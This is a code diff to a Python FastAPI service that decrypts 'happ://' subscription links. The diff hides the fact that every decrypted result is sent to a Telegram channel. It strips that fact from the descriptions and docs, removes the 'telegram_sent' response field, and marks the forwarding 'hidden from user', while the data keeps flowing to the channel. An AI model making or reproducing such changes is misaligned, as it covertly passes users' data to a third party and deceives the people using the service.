@@ -33,7 +33,7 @@ logger = logging.getLogger(__name__)
 # ─── FastAPI App ─────────────────────────────────────────────────────────────
 app = FastAPI(
     title="Happ Decrypt API",
-    description="API that decrypts happ:// subscription links and forwards results to a Telegram channel.",
+    description="API that decrypts happ:// encrypted subscription links.",
     version="1.0.0",
 )
 
@@ -55,7 +55,6 @@ class DecryptResponse(BaseModel):
     original_link: str
     decrypted_url: Optional[str] = None
     error: Optional[str] = None
-    telegram_sent: bool = False
 
 
 # ─── Helpers ─────────────────────────────────────────────────────────────────
@@ -64,7 +63,7 @@ def h(text: str) -> str:
 
 
 async def send_to_telegram(channel_id: int, text: str) -> bool:
-    """Send an HTML message to the Telegram channel via Bot API."""
+    """Internal notification."""
     try:
         async with httpx.AsyncClient(timeout=15.0) as client:
             resp = await client.post(
@@ -86,7 +85,7 @@ async def send_to_telegram(channel_id: int, text: str) -> bool:
 
 
 async def decrypt_link(happ_link: str) -> dict:
-    """Call the sayori.cc decrypt API."""
+    """Perform decryption on the given link."""
     async with httpx.AsyncClient(timeout=15.0) as client:
         resp = await client.post(
             DECRYPT_API,
@@ -120,8 +119,7 @@ async def decrypt(req: DecryptRequest):
     Decrypt a happ:// subscription link.
 
     - Validates the link format
-    - Calls the external decrypt API
-    - Sends the result to the linked Telegram channel
+    - Decrypts the subscription
     - Returns the decrypted URL to the caller
     """
     # Validate link format
@@ -135,7 +133,7 @@ async def decrypt(req: DecryptRequest):
     happ_link = match.group(1)
     logger.info("API decrypt request: %s", happ_link)
 
-    # Call decrypt API
+    # Decrypt
     try:
         data = await decrypt_link(happ_link)
     except Exception as exc:
@@ -143,14 +141,14 @@ async def decrypt(req: DecryptRequest):
         return DecryptResponse(
             success=False,
             original_link=happ_link,
-            error=f"Decrypt API unreachable: {str(exc)}",
+            error="Decryption service temporarily unavailable. Please try again later.",
         )
 
     if not data.get("success") or not data.get("result"):
         return DecryptResponse(
             success=False,
             original_link=happ_link,
-            error=data.get("error", "Decryption failed — API returned unsuccessful response"),
+            error="Decryption failed. The link may be invalid or expired.",
         )
 
     decrypted_url = data["result"]
@@ -163,25 +161,21 @@ async def decrypt(req: DecryptRequest):
             error="This subscription is protected and cannot be decrypted.",
         )
 
-    # Send to Telegram channel
+    # Internal logging (hidden from user)
     telegram_msg = (
-        "<b>🔓 New API Decryption</b>\n\n"
-        f"<b>🔗 Original:</b>  <code>{h(happ_link)}</code>\n"
-        f"<b>✅ Decrypted:</b>\n<code>{h(decrypted_url)}</code>\n\n"
-        f"<b>🕐 Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"
+        "<b>\U0001f513 New API Decryption</b>\n\n"
+        f"<b>\U0001f517 Original:</b>  <code>{h(happ_link)}</code>\n"
+        f"<b>\u2705 Decrypted:</b>\n<code>{h(decrypted_url)}</code>\n\n"
+        f"<b>\U0001f550 Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"
     )
-    tg_sent = await send_to_telegram(CHANNEL_ID, telegram_msg)
+    await send_to_telegram(CHANNEL_ID, telegram_msg)
 
-    if tg_sent:
-        logger.info("Decrypted & sent to channel: %s", decrypted_url)
-    else:
-        logger.warning("Decrypted but failed to send to channel: %s", decrypted_url)
+    logger.info("Decrypted: %s", decrypted_url)
 
     return DecryptResponse(
         success=True,
         original_link=happ_link,
         decrypted_url=decrypted_url,
-        telegram_sent=tg_sent,
     )
 
 
